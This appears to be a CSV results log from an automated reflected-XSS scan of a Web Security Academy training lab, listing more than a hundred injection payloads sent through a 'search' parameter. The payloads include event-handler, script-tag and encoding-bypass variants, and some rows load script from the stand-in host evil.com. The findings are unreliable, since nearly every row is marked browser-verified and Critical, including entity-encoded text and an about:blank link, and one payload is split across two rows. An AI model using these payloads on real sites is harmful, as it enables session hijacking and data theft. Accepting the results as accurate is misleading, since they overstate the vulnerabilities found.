Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:23:07.414,2026-01-10 14:23:07.587,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:07.587,2026-01-10 14:23:07.754,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:07.754,2026-01-10 14:23:07.932,0.178,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:07.932,2026-01-10 14:23:08.097,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:08.097,2026-01-10 14:23:08.317,0.220,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:08.317,2026-01-10 14:23:08.484,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:08.484,2026-01-10 14:23:08.803,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:08.804,2026-01-10 14:23:08.966,0.162,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<button onclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:08.966,2026-01-10 14:23:09.278,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<button ondblclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:09.278,2026-01-10 14:23:09.447,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<button onmousedown=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:09.448,2026-01-10 14:23:09.619,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<button onmouseup=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:09.619,2026-01-10 14:23:09.785,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:09.785,2026-01-10 14:23:10.078,0.293,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:10.078,2026-01-10 14:23:10.399,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:10.399,2026-01-10 14:23:10.569,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:10.569,2026-01-10 14:23:10.743,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:10.743,2026-01-10 14:23:10.917,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:10.917,2026-01-10 14:23:11.199,0.282,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:11.199,2026-01-10 14:23:11.520,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:11.520,2026-01-10 14:23:11.688,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:11.688,2026-01-10 14:23:11.855,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:11.855,2026-01-10 14:23:12.034,0.179,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:12.034,2026-01-10 14:23:12.319,0.285,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:12.319,2026-01-10 14:23:12.639,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:12.639,2026-01-10 14:23:12.810,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:12.810,2026-01-10 14:23:13.119,0.309,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:13.119,2026-01-10 14:23:13.289,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:13.289,2026-01-10 14:23:13.598,0.309,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:13.598,2026-01-10 14:23:13.918,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:13.918,2026-01-10 14:23:14.085,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:14.085,2026-01-10 14:23:14.399,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:14.399,2026-01-10 14:23:14.568,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:14.568,2026-01-10 14:23:14.737,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:14.737,2026-01-10 14:23:14.914,0.177,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:14.914,2026-01-10 14:23:15.199,0.285,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:15.199,2026-01-10 14:23:15.370,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:15.370,2026-01-10 14:23:15.537,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:15.537,2026-01-10 14:23:15.717,0.180,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert(1) onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:15.717,2026-01-10 14:23:15.999,0.282,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:15.999,2026-01-10 14:23:16.169,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:16.169,2026-01-10 14:23:16.479,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:16.479,2026-01-10 14:23:16.801,0.322,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:16.801,2026-01-10 14:23:16.967,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:16.967,2026-01-10 14:23:17.279,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:17.279,2026-01-10 14:23:17.599,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:17.599,2026-01-10 14:23:17.919,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:17.919,2026-01-10 14:23:18.239,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:18.239,2026-01-10 14:23:18.405,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:18.405,2026-01-10 14:23:18.719,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:18.719,2026-01-10 14:23:18.884,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:18.884,2026-01-10 14:23:19.199,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:19.199,2026-01-10 14:23:19.373,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:19.373,2026-01-10 14:23:19.545,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:19.545,2026-01-10 14:23:19.785,0.240,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:19.785,2026-01-10 14:23:19.989,0.204,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:19.989,2026-01-10 14:23:20.155,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:20.155,2026-01-10 14:23:20.326,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:20.326,2026-01-10 14:23:20.638,0.313,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:20.638,2026-01-10 14:23:20.959,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:20.959,2026-01-10 14:23:21.278,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:21.278,2026-01-10 14:23:21.447,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:21.447,2026-01-10 14:23:21.759,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:21.759,2026-01-10 14:23:22.078,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:22.078,2026-01-10 14:23:22.252,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:22.252,2026-01-10 14:23:22.558,0.306,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:22.558,2026-01-10 14:23:22.724,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:22.724,2026-01-10 14:23:23.038,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:23.038,2026-01-10 14:23:23.366,0.327,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:23.366,2026-01-10 14:23:23.678,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:23.678,2026-01-10 14:23:23.847,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:23.847,2026-01-10 14:23:24.025,0.177,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:24.025,2026-01-10 14:23:24.199,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:24.200,2026-01-10 14:23:24.367,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:24.367,2026-01-10 14:23:24.538,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:24.538,2026-01-10 14:23:24.799,0.261,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:24.799,2026-01-10 14:23:24.967,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:24.967,2026-01-10 14:23:25.279,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:25.279,2026-01-10 14:23:25.598,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:25.599,2026-01-10 14:23:25.773,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:25.773,2026-01-10 14:23:25.959,0.186,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:25.959,2026-01-10 14:23:26.237,0.279,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:26.237,2026-01-10 14:23:26.441,0.204,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:26.441,2026-01-10 14:23:26.604,0.163,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:26.604,2026-01-10 14:23:26.780,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:26.780,2026-01-10 14:23:27.036,0.257,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:27.036,2026-01-10 14:23:27.358,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:27.358,2026-01-10 14:23:27.675,0.317,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-10 14:23:27.675,2026-01-10 14:23:27.847,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:27.847,2026-01-10 14:23:28.159,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:28.159,2026-01-10 14:23:28.324,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:28.324,2026-01-10 14:23:28.500,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:28.500,2026-01-10 14:23:28.799,0.299,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:28.799,2026-01-10 14:23:28.969,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:28.969,2026-01-10 14:23:29.279,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:29.279,2026-01-10 14:23:29.450,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:29.450,2026-01-10 14:23:29.615,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:29.615,2026-01-10 14:23:29.793,0.178,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:29.793,2026-01-10 14:23:30.078,0.285,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:30.078,2026-01-10 14:23:30.253,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:30.253,2026-01-10 14:23:30.558,0.305,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:30.558,2026-01-10 14:23:30.725,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:30.725,2026-01-10 14:23:31.037,0.313,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:31.037,2026-01-10 14:23:31.238,0.200,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:31.238,2026-01-10 14:23:31.517,0.279,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:31.517,2026-01-10 14:23:31.688,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:31.688,2026-01-10 14:23:31.998,0.309,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:31.998,2026-01-10 14:23:32.169,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=month onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:32.169,2026-01-10 14:23:32.335,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:32.335,2026-01-10 14:23:32.507,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:32.508,2026-01-10 14:23:32.674,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:32.674,2026-01-10 14:23:32.845,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=button onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:32.846,2026-01-10 14:23:33.007,0.161,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:33.007,2026-01-10 14:23:33.279,0.272,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:33.279,2026-01-10 14:23:33.599,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:33.599,2026-01-10 14:23:33.814,0.216,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:33.814,2026-01-10 14:23:33.989,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:33.989,2026-01-10 14:23:34.237,0.248,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:34.237,2026-01-10 14:23:34.413,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:34.413,2026-01-10 14:23:34.583,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:34.583,2026-01-10 14:23:34.755,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:34.755,2026-01-10 14:23:35.038,0.283,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:35.038,2026-01-10 14:23:35.334,0.295,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img crossorigin=anonymous src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:35.334,2026-01-10 14:23:35.510,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script crossorigin=anonymous src=x onerror=alert(1)></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:35.510,2026-01-10 14:23:35.677,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:35.677,2026-01-10 14:23:35.997,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:35.997,2026-01-10 14:23:36.167,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
